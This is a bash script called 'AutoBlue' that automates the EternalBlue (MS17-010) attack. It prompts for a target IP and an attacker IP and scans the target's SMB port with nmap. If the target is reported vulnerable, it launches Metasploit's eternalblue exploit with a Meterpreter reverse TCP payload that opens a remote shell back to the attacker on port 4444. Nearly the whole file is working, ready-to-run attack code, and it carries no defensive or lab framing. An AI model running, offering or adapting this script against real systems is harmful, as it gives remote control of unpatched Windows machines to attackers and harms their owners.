#!/bin/bash

# AutoBlue- EternalBlue Exploit Automation Script
# Author: Atith Khawas
# Version: 1.0
# Purpose: Automate scanning and exploiting EternalBlue vulnerability

# Output File
OUTPUT_FILE="autoblue.log"
echo "AutoBlue Execution Log File - $(date)" > $OUTPUT_FILE

echo "===========================================" | tee -a $OUTPUT_FILE
echo "*******************************************" | tee -a $OUTPUT_FILE
echo "AutoBlue   - EternalBlue Exploit Automation" | tee -a $OUTPUT_FILE
echo "*******************************************" | tee -a $OUTPUT_FILE
echo "*******************************************" | tee -a $OUTPUT_FILE
echo "-----------------------Made by ATITH KHAWAS" | tee -a $OUTPUT_FILE
echo "===========================================" | tee -a $OUTPUT_FILE

# Step 1: Get Target IP Address
read -p "Enter Target IP Address: " target_ip

# Read the Attacker IP for later exploit
read -p "Enter Your IP Address: " your_ip

# Log the target IP
echo "Target IP Address: $target_ip" | tee -a $OUTPUT_FILE

# Step 2: Scan for SMB Vulnerability
echo "[+] Scanning Target for MS17-010 Vulnerability..." | tee -a $OUTPUT_FILE
nmap -p445 --script smb-vuln-ms17-010 -oN nmap_scan.log $target_ip | tee -a $OUTPUT_FILE

# Save the scan results to output file
cat nmap_scan.log >> $OUTPUT_FILE

# Step 3: Check Scan Results
vuln_check=$(grep -i "VULNERABLE" nmap_scan.log)

if [[ -n "$vuln_check" ]]; then
    echo "[+] Target is VULNERABLE to EternalBlue!" | tee -a $OUTPUT_FILE

    # Step 4: Launch Metasploit and Attack
    echo "[+] Launching Metasploit..." | tee -a $OUTPUT_FILE
    msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; 
                      set RHOSTS $target_ip; 
                      set PAYLOAD windows/x64/meterpreter/reverse_tcp; 
                      set LHOST $your_ip;
                      set LPORT 4444;
                      exploit" | tee -a $OUTPUT_FILE
else
    echo "[-] Target is NOT vulnerable to EternalBlue!" | tee -a $OUTPUT_FILE
    echo "Exiting..." | tee -a $OUTPUT_FILE
    exit 1
fi

# Log completion
echo "[+] Script Execution Completed!" | tee -a $OUTPUT_FILE
